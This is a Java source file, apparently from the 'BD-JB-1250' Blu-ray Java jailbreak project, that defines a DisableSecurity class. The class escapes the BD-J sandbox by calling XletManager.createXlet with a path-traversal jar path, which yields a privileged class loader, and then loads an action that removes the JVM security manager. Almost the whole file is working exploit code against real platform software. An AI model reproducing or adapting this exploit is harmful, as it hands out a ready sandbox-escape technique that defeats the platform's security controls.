package org.bdj;

import java.net.URLClassLoader;

import com.sun.xlet.XletLifecycleHandler;
import com.sun.xlet.XletManager;

// Part of BD-JB-1250 by Gezine
// Class that uses the BD-JB-1250 exploit to disable JVM security when instantiated

public class DisableSecurity {
	public static final int ENABLED = 0;
	public static final int DISABLED_BY_EXPLOIT = 1;
	public static final int DISABLED_PREVIOUSLY = 2;

	// Whether security is enabled after the constructor runs
	public int status = ENABLED;

	// Exception object, in case security could not be disabled
	public Exception exception = null;

	public DisableSecurity() {
		if (System.getSecurityManager() == null) {
			status = DISABLED_PREVIOUSLY;
			return;
		}
		try {
			// Abuse createXlet to create a privileged XletManager
			String stub = "org.bdj.DisableSecurityXlet";
			String jar = "file:///app0/bdjstack/lib/ext/../../../../disc/BDMV/JAR/00000.jar";
			String[] jars = new String[]{ jar };
			XletLifecycleHandler handler = XletManager.createXlet(stub, jars, new String[0]);
			XletManager manager = (XletManager) handler;

			// Get a privileged ClassLoader from the XletManager
			URLClassLoader cl = (URLClassLoader) manager.getClassLoader();

			// Call the privileged action to disable security
			Class action = cl.loadClass("org.bdj.DisableSecurityAction");
			action.newInstance();

			// Check that it worked
			if (System.getSecurityManager() != null) {
				throw new Exception("Privileged action didn't disable JVM security");
			}
			status = DISABLED_BY_EXPLOIT;
		} catch (Throwable e) {
			exception = new Exception(e);
		}
	}
}
